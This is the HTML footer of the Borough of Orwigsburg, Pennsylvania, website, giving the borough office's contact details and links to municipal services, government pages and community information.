 </ul> 
</div></div> </div> </div> 
</div></div> </div> </div> 
</div></div><div id='stacks_out_255' class='stacks_out'><div id='stacks_in_255' class='stacks_in '><div id='stacks_out_255_1' class='stacks_out'><div id='stacks_in_255_1' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-edge     '  > <div class='columns small-12      '> <div  class="sgw-footer" style=""> <!-- Total Toggle -->





  
	<div id='stacks_out_255_47' class='stacks_out'><div id='stacks_in_255_47' class='stacks_in com_joeworkman_stacks_foundation_2col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_255_52' class='stacks_out'><div id='stacks_in_255_52' class='stacks_in com_joeworkman_stacks_totalcms_image_stack'>   <a href="../" title="Home"> <img loading="auto" class="   center " oncontextmenu="return false;" draggable="false" alt='' data-img="https://orwigsburg.gov/cms-data/image/footer-logo.png"  src="https://orwigsburg.gov/cms-data/image/footer-logo-sq.png"   onerror="this.style.display='none'"  /> </a>   















 
</div></div>


  

 
  </div> <div class='columns small-12    medium-9     ' >  <div id='stacks_out_255_10' class='stacks_out'><div id='stacks_in_255_10' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h3>&nbsp; &nbsp;<br><br></h3><h1><strong>Borough Of Orwigsburg</strong></h1>    
 
</div></div>  </div> </div> 
</div></div>


  

 
<div id='stacks_out_255_41' class='stacks_out'><div id='stacks_in_255_41' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_255_15' class='stacks_out'><div id='stacks_in_255_15' class='stacks_in com_joeworkman_stacks_foundation_4col_s3_stack'> 
<div class='row   max-custom  '  > <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_255_22' class='stacks_out'><div id='stacks_in_255_22' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Contact Information</h4><p><strong>Address</strong><br>333 S. Liberty St.<br>Orwigsburg, Pa 17961</p><p><strong>Office Hours</strong><br>8:00 a.m. to 5:00 p.m.<br>Phone Hours<br>8:00 a.m. to 5: 00 p.m.<br><strong>Phone</strong><br>(570)-366-3103<br><strong>Fax</strong><br>(570)-366-3106<br><br><a href="/contact"><strong>Contact Form</strong></a></p><p><br><br><br></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_255_26' class='stacks_out'><div id='stacks_in_255_26' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Living &amp; Working</h4><p><a href="/history">Borough History<br></a><a href="/live/churches/">Churches</a><br><a href="/play/events/">Events</a><br><a href="/fyi">FYI Articles</a><br><a href="/government/employment/">Job Openings<br></a><a href="/live/library/">Library</a><br><a href="/live/orgs/">Organizations<br></a><a href="/play/parks-rec/">Parks &amp; Recreation<br></a><a href="/gallery">Photo Gallery<br></a><a href="/live/schools/">Schools</a><a href="/history"></a></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_255_30' class='stacks_out'><div id='stacks_in_255_30' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Services</h4><p><a href="/services/utility-payment/">Utility Payment<br></a><a href="/services/ambulance/">Ambulance Service<br></a><a href="/services/police/">Police Department</a><br><a href="/services/water/">Water Department<br></a><a href="/services/streets/">Streets Department</a><br><a href="/services/sewer/">Sewer Department</a><br><a href="/services/fire/">Fire Department</a><br><a href="/services/garbage-recycling/">Sanitation Department</a><br><a href="/services/swift/"></a><a href="https://www.smart911.com/smart911/ref/login.action?pa=orwigsburg">RAVE Mobile Safety</a></p><p><br><br><br></p>    
 
</div></div>


  

 
  </div> <div class='columns small-12    medium-3     ' >  <!-- Total Toggle -->





  
	<div id='stacks_out_255_34' class='stacks_out'><div id='stacks_in_255_34' class='stacks_in com_joeworkman_stacks_totalcms_text2_stack'>    <h4>Government</h4><p><a href="/government/forms/"></a><a href="/government/forms/">Borough Forms</a><br><a href="/government/officials/">Borough Officials</a><br><a href="/government/building-zoning/">Building/Zoning Codes</a><br><a href="/government/community-reports/">Community Reports</a><br><a href="/government/employment/">Employment</a><br><a href="/government/financials/">Financial Reports</a><br><a href="/government/gov-news">Government News</a><br><a href="/government/public-meetings/">Public Meetings</a><br><a href="/government/tax-collection/">Tax Collection</a> <br><br><br></p><p><br></p>    
 
</div></div>


  

 
  </div> </div> 
</div></div><div id='stacks_out_255_40' class='stacks_out'><div id='stacks_in_255_40' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div><div id='stacks_out_255_2' class='stacks_out'><div id='stacks_in_255_2' class='stacks_in com_joeworkman_stacks_foundation_1col_s3_stack'> 
<div class='row  collapse max-custom     '  > <div class='columns small-12  small-centered      '> <!-- Total Toggle -->





  



  

 
 </div> </div> 
</div></div><div id='stacks_out_255_42' class='stacks_out'><div id='stacks_in_255_42' class='stacks_in com_joeworkman_stacks_foundation_divider_s3_stack'><hr class=""/> 
</div></div> </div>  
<div  class="sgw-developer" style=""> <div id='stacks_out_255_8' class='stacks_out'><div id='stacks_in_255_8' class='stacks_in com_joeworkman_stacks_foundation_footertext_stack'><p class="copyright text-right ">  Site Design: <a href="https://cottsinc.com">&copy; 2018 Cotts, Inc Digital Marketing | </a> </p> 
</div></div> </div>  
 </div> </div> 
</div></div></div></div></div></div><!--  -->







<script data-cfasync="true" src="../rw_common/themes/foundation/foundation.min.js"></script>


<script src="../rw_common/assets/global.js"></script>
<script src="https://website-widgets.pages.dev/dist/sienna.min.js" defer></script></body>
</html>
